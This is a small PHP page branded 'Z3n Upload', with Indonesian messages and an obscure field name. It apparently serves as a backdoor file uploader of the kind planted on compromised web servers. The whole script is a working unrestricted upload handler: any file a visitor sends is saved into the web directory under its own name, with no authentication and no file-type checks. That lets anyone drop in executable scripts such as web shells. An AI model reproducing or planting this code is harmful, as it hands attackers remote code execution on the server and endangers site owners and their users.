<!DOCTYPE html>
<html>
<head>
    <title>Form Upload File</title>
</head>
<body>
    <h2>Z3n Upload</h2>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uk45'])) {
        $uploadedFile = $_FILES['uk45'];

        if ($uploadedFile['error'] === UPLOAD_ERR_OK) {
            $targetPath = './' . basename($uploadedFile['name']);

            if (move_uploaded_file($uploadedFile['tmp_name'], $targetPath)) {
                echo "File berhasil diunggah dan disimpan dengan nama: " . $uploadedFile['name'];
            } else {
                echo "Gagal mengunggah file.";
            }
        } else {
            echo "Error saat mengunggah file: " . $uploadedFile['error'];
        }
    }
    ?>

    <form method="post" enctype="multipart/form-data">
        <input type="file" name="uk45">
        <button type="submit">Gaskan</button>
    </form>
</body>
</html>

